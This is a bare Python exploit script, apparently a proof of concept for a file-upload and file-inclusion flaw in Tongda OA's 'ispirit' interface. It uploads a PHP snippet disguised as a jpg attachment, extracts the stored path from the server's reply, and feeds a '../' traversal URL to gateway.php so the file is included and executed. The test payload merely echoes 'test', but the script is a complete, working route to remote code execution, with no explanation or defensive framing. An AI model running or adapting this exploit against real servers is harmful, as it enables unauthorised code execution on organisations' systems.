import requests

upload_url = "http://192.168.3.101:8888//ispirit/im/upload.php"

exp_url = "http://192.168.3.101:8888//ispirit/interface/gateway.php"

files = {'ATTACHMENT':('jpg','<?php echo "test";?>')}

data = {'P':123,'DEST_UID':'111','UPLOAD_MODE':1}

r = requests.post(upload_url,data=data,files=files,proxies={'http':"http://127.0.0.1:8080"})

file = r.json()['content']

filename = file.split("|")[0].split("_")[1]

path = file.split("|")[0].split("_")[0].split("@")[1]

#jsonurl = '../../ispirit/../../attach/im/{}/{}.jpg'.format(path,filename)

exp_data = {"json":'{{"url":"../../ispirit/../../attach/im/{}/{}.jpg"}}'.format(path,filename)}

result = requests.post(exp_url,data=exp_data,proxies={'http':"http://127.0.0.1:8080"})

print(result.text)

